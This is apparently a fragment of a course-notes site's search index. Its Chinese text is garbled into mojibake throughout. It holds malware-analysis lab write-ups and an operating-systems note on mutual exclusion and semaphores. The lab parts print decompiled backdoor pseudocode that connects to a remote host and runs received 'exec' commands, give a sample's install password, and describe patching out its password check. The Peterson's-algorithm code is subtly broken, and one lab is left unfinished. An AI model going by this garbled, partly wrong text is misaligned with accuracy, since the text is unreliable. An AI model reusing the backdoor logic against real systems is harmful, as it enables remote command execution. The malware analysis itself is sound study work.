æ–‡ä»¶è¾¾åˆ°æŒç»­è¿è¡Œçš„æ•ˆæœã€‚\nQUESTION 2 #   What are two good host-based signatures for this malware?\n ä¸Šé¢çš„åˆ†æè¡¨ç¤º Lab07-03.exe è¿™ä¸ªæ–‡ä»¶ä¿®æ”¹äº† C:\\* ä¸­æ‰€æœ‰ä»¥ .exe ç»“å°¾çš„æ–‡ä»¶ï¼ˆå¯æ‰§è¡Œæ–‡ä»¶ï¼‰ï¼Œå¹¶ä¸”å°†å…¶ä¸­çš„ kernel32.dll æ›¿æ¢ä¸ºæ–°çš„åŠ¨æ€é“¾æ¥åº“ã€‚\nç”±äºæš‚æ—¶è¿˜æœªåˆ†æå‡ºæ›¿æ¢çš„å†…å®¹ï¼ˆè¿™ä¸€éƒ¨åˆ†åº”è¯¥æ˜¯ main å‡½æ•°ä¸­è¢«å¿½ç•¥çš„éƒ¨åˆ†çš„ä»£ç çš„é€»è¾‘ï¼‰ï¼Œæˆ‘ä»¬åªèƒ½çŒœæµ‹è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“æ˜¯ Lab07-03.dllï¼ˆæˆ‘è§‰å¾—è¿™ä¸ªçŒœæµ‹éå¸¸åˆç†ï¼‰ã€‚\nå› æ­¤æ¶æ„ä»£ç çš„æ ¸å¿ƒæ˜¯è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“å®Œæˆçš„åŠŸèƒ½ï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥åˆ†æè¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ã€‚é¦–å…ˆåˆ†æå‡½æ•°çš„å¯¼å…¥è¡¨ï¼š\nå‘ç°è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“å¯¼å…¥äº† CreateProcessAï¼ŒCreateMutexAï¼ŒOpenMutexA ç­‰çº¿ç¨‹ç›¸å…³å‡½æ•°ï¼Œåœ¨å·¦ä¾§è¿˜å‘ç°å®ƒå¯¼å…¥äº† W32_32.dll è¿™ä¸ªä¸ç½‘ç»œè¯·æ±‚ç›¸å…³çš„åŠ¨æ€é“¾æ¥åº“ã€‚\nåœ¨ IdaPro ä¸­ï¼Œè¿™ä¸ªåŠ¨æ€é“¾æ¥åº“æœ‰ä¸€ä¸ªåä¸º DllMain çš„å‡½æ•°ï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥åˆ†æè¿™ä¸ªå‡½æ•°çš„é€»è¾‘ã€‚æŸ¥çœ‹å…¶ä¼ªä»£ç ï¼Œåœ¨åˆ›å»ºå±€éƒ¨å˜é‡ã€åŠ é”ï¼ˆåä¸º SADFHUHFï¼‰ã€æ¡ä»¶åˆ¤æ–­ç­‰æ“ä½œä¹‹åï¼Œè¿›å…¥äº†ä»¥ä¸‹çš„ä¸»è¦ä»£ç æµç¨‹ï¼š\nv3 = socket(2, 1, 6); if ( v3 != -1 ) {  name.sa_family = 2;  *(_DWORD *)\u0026amp;name.sa_data[2] = inet_addr(cp);  *(_WORD *)\u0026amp;name.sa_data[0] = htons(0x50u);  if ( connect(v3, \u0026amp;name, 16) != -1 )  {  while ( send(v3, ::buf, strlen(::buf), 0) != -1 \u0026amp;\u0026amp; shutdown(v3, 1) != -1 )  {  if ( recv(v3, \u0026amp;buf, 4096, 0) \u0026gt; 0 )  {  if ( !strncmp(Str1, \u0026amp;buf, 5u) )  {  Sleep(0x60000u);  }  else if ( !strncmp(aExec, \u0026amp;buf, 4u) )  {  memset(\u0026amp;StartupInfo, 0, sizeof(StartupInfo));  StartupInfo.cb = 68;  CreateProcessA(0, \u0026amp;CommandLine, 0, 0, 1, 0x8000000u, 0, 0, \u0026amp;StartupInfo, \u0026amp;ProcessInformation);  }  else  {  if ( buf == 113 )  {  CloseHandle(hObject);  break;  }  Sleep(0x60000u);  }  }  }  } } closesocket(v3); åˆ†æå…¶é€»è¾‘ï¼Œåº”ç”¨ç¨‹åºåˆ›å»ºäº†ä¸€ä¸ªå¥—æ¥å­—ï¼Œä¸»åŠ¨è¿æ¥åˆ°äº† cp = 127.26.152.13 çš„ 0x50 = 80 ç«¯å£ï¼Œå¹¶ä¸”æ¥å—ä¸‰ç§å­—ç¬¦ä¸²çš„ä¼ å…¥å†…å®¹ï¼š\n Str1 = sleepï¼Œåº”ç”¨ç¨‹åºä¼šç¡çœ  0x60000 ms = 393216 ms = 6.5 minï¼› aExec = execï¼Œåº”ç”¨ç¨‹åºä¼šåˆ›å»ºä¸€ä¸ªä¾›è¿œç¨‹æ‰§è¡Œçš„ shellï¼Œæ‰§è¡Œä»»æ„ä»£ç ï¼› chr(113) = qï¼Œåº”ç”¨ç¨‹åºä¼šç»“æŸã€‚  ç»¼ä¸Šæ‰€è¿°ï¼Œæ¶æ„ä»£ç æ„ŸæŸ“çš„ä¸»æœºç‰¹å¾ä¸»è¦æ˜¯ä»¥ä¸‹ä¸¤ç‚¹ï¼š\n åˆ›å»ºäº†äº’æ–¥é‡ï¼Œå…¶åç§°ä¸º SADFHUHFï¼› æ”¹å˜äº† C ç›˜ä¸­æ‰€æœ‰å¯æ‰§è¡Œæ–‡ä»¶çš„ kernel32.dll åŠ¨æ€é“¾æ¥åº“è¿æ¥ä½ç½®ã€‚  QUESTION 3 #   What is the purpose of this program?\n ä»ç¬¬äºŒé—®çš„åˆ†æä¸­æˆ‘ä»¬çŸ¥é“è¿™ä¸ªç¨‹åºåªè¦å®Œæˆçš„åŠŸèƒ½æ˜¯ç»™ 127.26.152.13:80 å»ºç«‹ä¸€ä¸ªå¯ä»¥è¿œç¨‹æ‰§è¡Œçš„å‘½ä»¤è¡Œã€‚å…¶å®ç°çš„æ–¹å¼æ˜¯æ›´æ”¹äº† C ç›˜ä¸Šæ‰€æœ‰å¯æ‰§è¡Œæ–‡ä»¶çš„ kernel32.dll é“¾æ¥ä½ç½®ã€‚\nQUESTION 4 #   How could you remove this malware once it is installed?\n å®ƒæ›´æ”¹äº† C ç›˜ä¸­çš„æ‰€æœ‰å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ¢å¤ç³»ç»Ÿç›¸å½“å›°éš¾ã€‚å¯ä»¥ï¼š\n é˜…è¯»å®Œæ•´çš„æ¶æ„ä»£ç çš„é€»è¾‘ï¼Œå¹¶ä¸”ç”¨ C++ å†™ä¸€ä¸ªå®Œæ•´æ¢å¤çš„ç¨‹åºï¼› å¤‡ä»½ç³»ç»Ÿï¼Œç›´æ¥æ¢å¤åˆ°ç³»ç»Ÿæœ€åˆçš„æ ·å­ã€‚  "},{"id":285,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/09/lab9-1/","title":"Lab9 1","section":"09","content":"lab 9-1 #  QUESTION 1 #   How can you get this malware to install itself?\n åœ¨ BinaryCollection/ æ–‡ä»¶å¤¹ä¸‹è¿è¡Œ diff å‘½ä»¤å¯ä»¥æŸ¥çœ‹ä¸¤ä¸ªæ–‡ä»¶ä¹‹é—´çš„å·®å¼‚ï¼š\n$ diff Chapter_9L/Lab09-01.exe Chapter_3L/Lab03-04.exe # æ²¡æœ‰è¿”å›å€¼è¯´æ˜è¿™ä¸¤ä¸ªæ–‡ä»¶æ²¡æœ‰ä»»ä½•ä¸åŒ æˆ‘ä»¬å‘ç° Lab09-01.exe ä¸ Lab03-04.exe æ˜¯åŒä¸€ä¸ªæ–‡ä»¶ã€‚åœ¨ Lab03-04 ä¸­ï¼Œæˆ‘ä»¬çš„åˆ†æç»“æœæ˜¯è¿™ä¸ªæ–‡ä»¶è¿è¡Œèµ·æ¥å°±ç›´æ¥é—ªé€€å¹¶ä¸”æŠŠè‡ªå·±åˆ é™¤äº†ã€‚\næˆ‘ä»¬å…ˆç”¨ PE Explorer æŸ¥çœ‹è¿™ä¸ªå‡½æ•°çš„å¯¼å…¥è¡¨å†…å®¹ï¼š\nå¯è§å®ƒå¯¼å…¥çš„åŠ¨æ€é“¾æ¥åº“ä»¥åŠå…¶ä¸­è°ƒç”¨çš„å‡½æ•°éƒ½éå¸¸æ•æ„Ÿï¼š\n KERNEL32.dll ä¸­çš„ CopyFileA()ã€WriteFile() ç­‰æ“ä½œæ–‡ä»¶çš„å‡½æ•°ï¼Œ CreateProcess() ç­‰æ“ä½œè¿›ç¨‹ã€äº’æ–¥é‡ç­‰ç›¸å…³çš„å‡½æ•°ï¼› ADVAPI32.dll ä¸­çš„ RegSetValueExA() ç­‰æ“ä½œæ³¨å†Œè¡¨çš„å‡½æ•°ï¼ŒCreateService()ã€DeleteService() ç­‰æ§åˆ¶ç³»ç»ŸæœåŠ¡çš„å‡½æ•°ï¼› SHELL32.dll åŠ¨æ€é“¾æ¥åº“ä»…å¯¼å…¥äº†ä¸€ä¸ªå‡½æ•°ï¼Œä½†éå¸¸æ•æ„Ÿï¼šShellExecuteA()ï¼› WS2_32.dll åˆ™æ˜¯ Windows Socket ç¼–ç¨‹ä¸­æœ€å¸¸ç”¨çš„åŠ¨æ€é“¾æ¥åº“ï¼Œè¿™è¯´æ˜è¿™ä¸ªç¨‹åºä¼šæœ‰ç½‘ç»œè¯·æ±‚ã€‚  ç„¶åæˆ‘ä»¬ç”¨ Ida Pro æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼ŒæŸ¥çœ‹å…¶ä¸­çš„ main å‡½æ•°ä¼ªä»£ç ï¼Œå‘ç°å…¶ä¸­çš„ä¸»è¦ä»£ç ç»“æ„æ˜¯ä¸€ä¸ªå¦‚ä¸‹çš„ if è¯­å¥ç»“æ„ï¼š\nint __cdecl main(int argc, const char **argv, const char **envp) {  // ... // æ­¤å¤„å®šä¹‰äº†å±€éƒ¨å˜é‡  if ( argc == 1 )  {  if ( !sub_401000() )  sub_402410();  sub_402360();  }  else  {  //.....  }  return 0; } æˆ‘ä»¬å¯¹ä»¥ä¸Šçš„ä¼ªä»£ç é€è¡Œåˆ†æï¼š\n å¯ä»¥çœ‹åˆ°ä¸»å‡½æ•°çš„ç¬¬ä¸€ä¸ªæ¡ä»¶åˆ†æ”¯è¯­å¥å°±æ˜¯åˆ¤æ–­å‘½ä»¤è¡Œå‚æ•°æ˜¯å¦ä¸º 1ï¼Œæ ¹æ®æˆ‘ä»¬ä¹‹å‰å¯¹ç—…æ¯’åˆ†æçš„ç»éªŒçŸ¥é“ sub_402360() è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½åº”è¯¥æ˜¯åˆ é™¤å¯æ‰§è¡Œæ–‡ä»¶æœ¬èº«ã€‚è€Œ sub_401000() æ˜¯ä¸€ä¸ªåˆ¤æ–­å‡½æ•°ï¼Œsub_402410() åˆ™åº”è¯¥æ˜¯è¿›è¡ŒæŠ¥é”™çš„å‡½æ•°ã€‚ åœ¨æ¡ä»¶åˆ†æ”¯çš„ else åˆ†æ”¯ä¸­è°ƒç”¨äº†æ›´å¤šçš„å‡½æ•°ï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥åˆ†æå…¶ä¸­çš„é€»è¾‘ã€‚  sub_402510()ï¼šåœ¨å‘½ä»¤è¡Œå‚æ•°å¤šäºä¸€ä¸ªæ—¶ï¼Œä»¥å‘½ä»¤è¡Œå‚æ•°çš„æœ€åä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºä¼ å…¥å€¼çš„å‡½æ•°ï¼š\nint __cdecl sub_402510(int a1) {  //.....  if ( strlen((const char *)a1) == 4 )  {  if ( *(_BYTE *)a1 == 97 )  {  v2 = *(_BYTE *)(a1 + 1) - *(_BYTE *)a1;  if ( v2 == 1 )  {  v3 = 99 * v2;  if ( v3 == *(_BYTE *)(a1 + 2) )  result = (char)(v3 + 1) == *(_BYTE *)(a1 + 3);  else  result = 0;  }  else  {  result = 0;  }  }  else  {  result = 0;  }  }  else  {  result = 0;  }  return result; } åˆ†æä»¥ä¸Šçš„ä¼ªä»£ç ï¼Œå‘ç°å¦‚æœä¼ å…¥çš„å­—ç¬¦ä¸²ä¸º chr(97) + chr(97 + 1) + chr(99 * 1) + chr(97 + 3) = abcd æ—¶è¿”å›çœŸï¼Œå¦åˆ™è¿”å› 0ã€‚\nå†è¿›ä¸€æ­¥åˆ†æä¸»å‡½æ•°çš„é€»è¾‘ï¼Œå¾—çŸ¥è¿è¡Œçš„å‘½ä»¤è¡Œå‘½ä»¤ä¸º ./Lab09-01.exe -in abcd\nQUESTION 2 #   What are the command-line options for this program? What is the password requirement?\n æ ¹æ®å¯¹å‰é¢åˆ†æå‡ºçš„ä¼ªä»£ç è¿›è¡Œè¿›ä¸€æ­¥åˆ†æï¼Œæˆ‘ä»¬æ€»ç»“äº†å‘½ä»¤è¡Œå‚æ•°çš„è¡¨æ ¼ï¼š\n   å‘½ä»¤è¡Œå‚æ•° æ‰§è¡Œçš„åŠŸèƒ½     ./.exe -in abcd å®‰è£…è‡ªèº«   ./.exe -re abcd åˆ é™¤è‡ªèº«   ./.exe -c abcd æ›´æ–°é…ç½®   ./.exe -cc abcd æ‰“å°é…ç½®    QUESTION 3 #   How can you use OllyDbg to permanently patch this malware, so that it doesnâ€™t require the special command-line password?\n å°†åˆ¤æ–­çš„é€»è¾‘æ”¹ä¸ºåå³å¯ã€‚æ¯”å¦‚å°† if è¯­å¥ä¸­çš„è·³è½¬ jz æ”¹æˆ jnzã€‚\nQUESTION 4 #   What are the host-based indicators of this malware?\n æ¶æ„ä»£ç åˆ›å»ºäº†ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft \\XPS\\Configurationï¼ŒåŒæ—¶å®ƒåˆ›å»ºäº†ä¸€ä¸ªæœåŠ¡ï¼Œé»˜è®¤åç§°ä¸ºæ¶æ„ä»£ç æ–‡ä»¶åï¼Œä¹Ÿå¯é€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šã€‚\nQUESTION 5 #   What are the different actions this malware can be instructed to take via the network?\n é€šè¿‡è¯» Ida Pro åˆ†æå‡ºæ¥çš„ä¼ªä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°è¿™ä¸ªç¨‹åºæ‰§è¡Œçš„ç½‘ç»œå‘½ä»¤å†…å®¹ï¼š\n   å‘½ä»¤æ ¼å¼ å‘½ä»¤æ•ˆæœ     SLEEP integer åº”ç”¨ç¨‹åºç¡çœ  integers é’Ÿ   UPLOAD port filename è¯»å–æœ¬åœ°æ–‡ä»¶å¹¶å‘è¿œç¨‹çš„æŒ‡å®šä¸»æœºç«¯å£å‘é€   CMD port æ‰§è¡Œå‘½ä»¤å¹¶ä¸”é€šè¿‡æŒ‡å®šç«¯å£å‘é€æ‰§è¡Œç»“æœ    QUESTION 6 #   Are there any useful network-based signatures for this malware?\n é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¶æ„ä»£ç å‘ http://www.practicalmalwareanalysis.com å‘é€ HTTP1.0GET è¯·æ±‚ï¼Œæ ¼å¼ä¸º ****/****.*** å…¶ä¸­ * æ˜¯éšæœºçš„æ•°å­—æˆ–å­—æ¯å­—ç¬¦ã€‚ å¯ä»¥é€šè¿‡ -c å‘½ä»¤é…ç½®ç›®æ ‡ä¸»æœºã€ç«¯å£å·ç­‰ã€‚\n"},{"id":286,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/09/lab9-2/","title":"Lab9 2","section":"09","content":"lab 9-2 #  QUESTION 1 #   What strings do you see statically in the binary?\n é¦–å…ˆä½¿ç”¨ PEexplorer ä¸­çš„åæ±‡ç¼–åŠŸèƒ½æŸ¥çœ‹å…¶ä¸­çš„ .rdata æ®µï¼š\nQUESTION 2 #   What happens when you run this binary?\n è¿è¡Œç¨‹åºï¼Œæ²¡æœ‰ä»»ä½•ååº”ã€‚ ä½¿ç”¨ Process Monitor æŸ¥çœ‹ï¼Œå­˜åœ¨ä¸€äº›æ–‡ä»¶å’Œæ³¨å†Œè¡¨æ“ä½œã€‚\nQUESTION 3 #   How can you get this sample to run its malicious payload?\n QUESTION 4 #  "},{"id":287,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/3.%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/","title":"3.è¿›ç¨‹é—´é€šä¿¡","section":"2.è¿›ç¨‹ä¸çº¿ç¨‹","content":"è¿›ç¨‹é—´é€šä¿¡ #  è¿›ç¨‹é—´éœ€è¦é€šä¿¡ï¼Œæˆ‘ä»¬éœ€è¦è®¾è®¡ä¸€äº†è‰¯å¥½çš„ç»“æ„ï¼Œä¸ä½¿ç”¨ä¸­æ–­çš„æ–¹å¼å®ç°ã€‚åœ¨æœ¬èŠ‚ä¸­å°†è®¨è®ºè¿›ç¨‹é—´é€šä¿¡ï¼ˆInter Process Comminucation, IPCï¼‰çš„é—®é¢˜ã€‚\nç«äº‰æ¡ä»¶ #  ä»€ä¹ˆæ˜¯ç«äº‰æ¡ä»¶ï¼Ÿ\n ç«äº‰æ¡ä»¶ (race condition)ï¼šä¸¤ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹å…±åŒè¯»å†™æŸäº›å…±äº«èµ„æºï¼Œè€Œæœ€åçš„æ‰§è¡Œè§£å†³å–å†³äºè¿›è¡Œè¿è¡Œæ—¶é—´çš„ç²¾ç¡®æ—¶åºæ—¶ï¼Œè¿™ç§æƒ…å†µç§°ä¸ºç«äº‰æ¡ä»¶ã€‚  æ€æ ·é¿å…ç«äº‰æ¡ä»¶ï¼Ÿ\n äº’æ–¥ (mutual exclusion)ï¼šä»¥æŸç§æ‰‹æ®µç¡®ä¿å½“ä¸€ä¸ªè¿›ç¨‹åœ¨ä½¿ç”¨ä¸€ä¸ªèµ„æºæ—¶ï¼Œå…¶ä»–è¿›ç¨‹å°±ä¸èƒ½å¯¹èµ„æºçš„åšåŒæ ·çš„æ“ä½œï¼› æˆ‘ä»¬æŠŠå…±äº«çš„å†…å­˜è¿›è¡Œè®¿é—®çš„ç¨‹åºç‰‡æ®µç§°ä½œä¸´ç•ŒåŒºåŸŸ (critical region)ã€‚å¦‚æœæˆ‘ä»¬é€šè¿‡åˆé€‚çš„å®‰æ’ä½¿å¾—ä¸¤ä¸ªè¿›ç¨‹ä¸å¯èƒ½åŒæ—¶å¤„äºä¸´ç•ŒåŒºï¼Œå°±èƒ½å¤Ÿé¿å…ç«äº‰æ¡ä»¶ã€‚  å¿™ç­‰å¾…çš„äº’æ–¥ #  ä¸‹é¢åˆ—ä¸¾çš„è¿™äº›å®ç°äº’æ–¥çš„æ–¹æ¡ˆï¼Œç»å¯¹æ€§åœ°ç¦æ­¢äº†ä¸¤ä¸ªè¿›ç¨‹å…±äº«ä¸€ä¸ªèµ„æºï¼š\n  å±è”½ä¸­æ–­ï¼šé¡¾åæ€ä¹‰ï¼Œä¸€ä¸ªè¿›ç¨‹æˆ–çº¿ç¨‹è¿›å…¥ä¸´ç•ŒåŒºåŸŸä¹‹åç«‹å³å±è”½æ‰€æœ‰ä¸­æ–­ï¼Œç¦»å¼€ä¹‹å‰å†æ‰“å¼€ä¸­æ–­ï¼›\n  é”å˜é‡ï¼šä¸€ç§è½¯ä»¶å±‚é¢çš„è§£å†³æ–¹æ¡ˆã€‚å³è®¾ç½®ä¸€ä¸ªå…±äº«çš„é”å˜é‡ï¼Œå…¶åˆå§‹å€¼ä¸º 0ï¼š\n ä¸€ä¸ªçº¿ç¨‹æƒ³è¦è¿›å…¥ä¸´ç•ŒåŒºä¹‹å‰éœ€è¦å…ˆæµ‹è¯•é”å˜é‡çš„å€¼ï¼Œä¸º 1 åˆ™ç»§ç»­ç­‰å¾…ï¼› å¦‚æœä¸º 0ï¼Œåˆ™çº¿ç¨‹è¿›å…¥è¿™ä¸ªä¸´ç•ŒåŒºï¼Œå¹¶ä¸”å°†é”å˜é‡çš„å€¼è®¾ç½®ä¸º 1ï¼Œç¦»å¼€æ—¶é‡ç½®ï¼›  æ˜¾ç„¶ï¼Œä½†å…¶å®è¿™ç§æ–¹æ³•ä»ç„¶ä¼šæœ‰æ¦‚ç‡å¯¼è‡´å¤šä¸ªçº¿ç¨‹åŒæ—¶è¿›å…¥ä¸´ç•ŒåŒºã€‚\n  ä¸¥æ ¼è½®æ¢æ³•ï¼šè®¾ç½®ä¸€ä¸ªå˜é‡ç”¨äºè®°å½•å½“å‰å¯ä»¥è¿›å…¥ä¸´ç•ŒåŒºçš„çº¿ç¨‹ï¼Œå„ä¸ªçº¿ç¨‹è¿ç»­æµ‹è¯•è¿™ä¸ªå˜é‡æ˜¯å¦å‡ºç°ç»™å®šçš„å€¼ã€‚è¿™ç§æ–¹å¼ç§°ä¸ºå¿™ç­‰å¾… (busy waiting)ï¼Œå¿™äºç­‰å¾…çš„é”ç§°ä¸ºè‡ªæ—‹é” (spin lock)ã€‚\nç”±äºè¿™ç§æ–¹å¼æ˜¯æµªè´¹ CPU æ—¶é—´çš„ï¼Œé€šå¸¸ä¼šé¿å…ã€‚åªæœ‰åœ¨æœ‰ç†ç”±è®¤ä¸ºç­‰å¾…æ—¶é—´éå¸¸çŸ­çš„æƒ…å†µä¸‹ï¼Œæ‰ä½¿ç”¨ã€‚\n  Peterson è§£æ³•ï¼šè·å…°æ•°å­¦å®¶ T.Dekker æå‡ºçš„ä¸€ç§ä¸éœ€è¦ä¸¥æ ¼è½®æ¢çš„è½¯ä»¶äº’æ–¥ç®—æ³•ã€‚åæ¥ Peterson å‘ç°äº†ä¸€ç§æ›´ç®€å•çš„äº’æ–¥ç®—æ³•ã€‚\nè¿™ä¸ªç®—æ³•çš„æ ¸å¿ƒæ˜¯ enter_region ä¸ leave_rigion è¿™æ ·ä¸¤ä¸ªå‡½æ•°ï¼Œæ¯”å¦‚æˆ‘ä»¬æœ‰ 2 ä¸ªçº¿ç¨‹ï¼š\n#define N 2\t// è¡¨ç¤ºä¸€å…±æœ‰ä¸¤ä¸ªçº¿ç¨‹ï¼Œä¸‹é¢ä¸¤ä¸ªå‡½æ•°çš„ä¼ å‚éƒ½æ˜¯æŒ‡çº¿ç¨‹å·ï¼Œå…±æœ‰ 01 ä¸¤ç§å–å€¼ int turn;\t// å½“å‰å®é™…å¯ä»¥å ç”¨èµ„æºçš„è¿›ç¨‹å· int interested[N];  void enter_region(int process) {  int other = 1 - process;\t// å¦ä¸€ä¸ªè¿›ç¨‹å·  interested[other] = TRUE;  turn = process;  while(turn==process \u0026amp;\u0026amp; interested[other] == TRUE); }  void leave_region(int process) {  interested[process] = FALSE; } å¦‚æœä¸€ä¸ªçº¿ç¨‹è°ƒç”¨äº† enter_region å‡½æ•°ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è·å¾— turn çš„èµ‹å€¼ï¼Œé‚£ä¹ˆè¯´æ˜è¿™ä¸ªçº¿ç¨‹è·å–èµ„æºå¤±è´¥ï¼Œå¯ä»¥å†æ¬¡è°ƒç”¨å‡½æ•°ï¼Œåˆ™å‡½æ•°ä¼šè¿›å…¥ç­‰å¾…çŠ¶æ€ã€‚\n  TSL æŒ‡ä»¤ï¼šæŒ‡ Test and Set Lockï¼Œæµ‹è¯•å¹¶åŠ é”ã€‚å®ƒçš„æ±‡ç¼–æ ¼å¼å¦‚ä¸‹ï¼š\nTSL RX,LOCK å®ƒå°†ä¸€ä¸ªå†…å­˜å­— LOCK è¯»å–åˆ° RX ä¸­ï¼Œå¹¶ä¸”åœ¨ LOCK ä¸Šç½®æ”¾ä¸€ä¸ªéé›¶å€¼ï¼Œè¿™ä¸¤æ­¥è¯»å†™æ“ä½œæ˜¯ä¸å¯åˆ†å‰²çš„ã€‚\n  ä¸Šé¢åˆ—ä¸¾çš„è¿™äº›æ–¹æ³•éƒ½æ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯å®ƒä»¬éƒ½æœ‰å¿™ç­‰çš„ç¼ºç‚¹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š\n å½“ä¸€ä¸ªè¿›ç¨‹æƒ³è¦è¿›å…¥ä¸´ç•ŒåŒºæ—¶ï¼Œå…ˆæ£€æŸ¥æ˜¯å¦ä¼šå…è®¸è¿›å…¥ï¼Œè‹¥ä¸å…è®¸ï¼Œè¯¥è¿›ç¨‹å°†åŸåœ°ç­‰å¾…ç›´åˆ°å…è®¸ä¸ºæ­¢ï¼›  è§£å†³è¿™ä¸ªç¼ºç‚¹æœ€ç®€å•çš„æ–¹æ³•æ˜¯ sleep å’Œ wakeupï¼š\n sleepï¼šä¸€ä¸ªå°†å¼•èµ·è¿›ç¨‹é˜»å¡çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå³è¢«æŒ‚èµ·ï¼ŒçŸ¥é“æ”¶åˆ°è¢«å”¤é†’çš„ä¿¡å·ï¼› wakeupï¼šä¹Ÿå°±æ˜¯å”¤é†’ä¸€ä¸ªæŒ‡å®šè¿›ç¨‹çš„æ“ä½œã€‚  æ¶ˆè´¹è€…ç”Ÿäº§è€…é—®é¢˜ #  é—®é¢˜ #  è€ƒè™‘è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼šä¸¤ä¸ªè¿›ç¨‹å…±äº«ä¸€ä¸ªç¼“å†²åŒºã€‚å…¶ä¸­ä¸€ä¸ªç”Ÿäº§è€…ï¼Œå°†ä¿¡æ¯æ”¾å…¥ç¼“å†²åŒºï¼›å¦ä¸€ä¸ªæ˜¯æ¶ˆè´¹è€…ï¼Œå°†ä¿¡æ¯ä»ç¼“å†²åŒºä¸­å–å‡ºã€‚ä¸€ä¸ªæ¯”è¾ƒæ­£å¸¸çš„å¤„ç†åŠæ³•æ˜¯ä»¥ä¸‹çš„æ–¹å¼ï¼š\n#define N 100\t// ç¼“å†²åŒºçš„æ•°ç›® int count = 0;\t// å½“å‰å­˜åœ¨ä¿¡æ¯çš„ç¼“å†²åŒºæ•°ç›®  void producer() {  int item;  while(TRUE) {  item = produce_item();  if (count == N) sleep();  insert_item(item);  count += 1;  if (count == 1) wakeup(consumer);  } }  void consumer() {  int item;  while(TRUE) {  if (count == 0) sleep();  item = remove_item();  count -= 1;  if (count == N-1) wakeup(producer);  consume_item(item);  } } è¿™ç§å¤„ç†åŠæ³•çœ‹èµ·æ¥å¾ˆå¥½ï¼Œä½†æ˜¯å®ƒæ˜¯å­˜åœ¨é—®é¢˜çš„ï¼š\n å¦‚æœæ¶ˆè´¹è€…æ£€æµ‹åˆ° 0ï¼Œsleep å‡½æ•°è¿˜æ²¡å¼€å§‹æ‰§è¡Œï¼Œç”Ÿäº§è€…å‘é€çš„ wakeup ä¿¡å·å°±å·²ç»åˆ°è¾¾ï¼Œé‚£ä¹ˆä¼ é€’ç»™æ¶ˆè´¹è€…çš„ wakeup ä¿¡å·å°†ä¸¢å¤±ï¼Œä¸¤ä¸ªçº¿ç¨‹æœ‰å¯èƒ½æ°¸ä¹…æ²‰ç¡ä¸‹å»ã€‚ è¿™ä¸ªé—®é¢˜å°±å«åšæ¶ˆè´¹è€…ç”Ÿäº§è€…é—®é¢˜ã€‚  ä¿¡å·é‡ #  Dijkstra å¼•å…¥äº†ä¸€ä¸ªæ–°çš„å˜é‡ç±»å‹ä¿¡å·é‡ (semaphore) ç”¨æ¥è®°å½•çº¿ç¨‹è¢«å”¤é†’çš„æ¬¡æ•°ã€‚ä»–å»ºè®®è®¾å®šä¸¤ç§æ“ä½œï¼Œå°†å…¶å‘½åä¸º down å’Œ upï¼Œåˆ†åˆ«å¯¹åº”ä¸€ä¸ªçº¿ç¨‹çš„ sleep ä¸ wakeup å‡½æ•°ï¼Œä¼ªä»£ç å¤§è‡´å¦‚ä¸‹ï¼š\nint semaphore = 0;\t// ä¿¡å·é‡  void down() {  while (TRUE) {  if (semaphore \u0026gt; 0) {  semaphore -= 1;  return;  }  sleep();  } }  void up() {  semaphore += 1;  wakeup(); } å¼•å…¥ä¿¡å·é‡çš„æ¦‚å¿µå¯ä»¥è§£å†³æ¶ˆè´¹è€…ç”Ÿäº§è€…é—®é¢˜ï¼š\n#define N 100 typedef int semaphore;  semaphore full = 0; semaphore empty = N; semaphore mutex = 1;  void producer() {  int item;  while (TURE) {  item = produce_item();  down(\u0026amp;empty);  down(\u0026amp;mutex); insert_item(item); up(\u0026amp;mutex);  up(\u0026amp;full);  } }  void consumer() {  int item;  while (TRUE) {  down(\u0026amp;full);  down(\u0026amp;mutex); item = remove_item(); up(\u0026amp;mutex);  up(\u0026amp;empty);  consume_item(item);  } }  è§£å†³æ–¹æ¡ˆä¸­ä¸€å…±æä¾›äº†ä¸‰ä¸ªä¿¡å·é‡ï¼š  ä¸€ä¸ªç§°ä¸º fullï¼Œç”¨æ¥è®°å½•è¢«å ç”¨ç¼“å†²åŒºçš„æ•°ç›®ï¼Œåˆå§‹å€¼ä¸º 0ï¼› ä¸€ä¸ªç§°ä¸º emptyï¼Œç”¨æ¥è®°å½•ç©ºé—²ç¼“å†²åŒºçš„æ•°ç›®ï¼Œåˆå§‹å€¼ä¸º Nï¼ˆç¼“å†²åŒºçš„æ€»æ•°ï¼‰ï¼› ä¸€ä¸ªç§°ä¸º mutexï¼Œé”å˜é‡ï¼Œç”¨æ¥ç¡®ä¿æ¶ˆè´¹è€…ç”Ÿäº§è€…ä¸ä¼šåŒæ—¶è®¿é—®ç¼“å†²åŒºã€‚    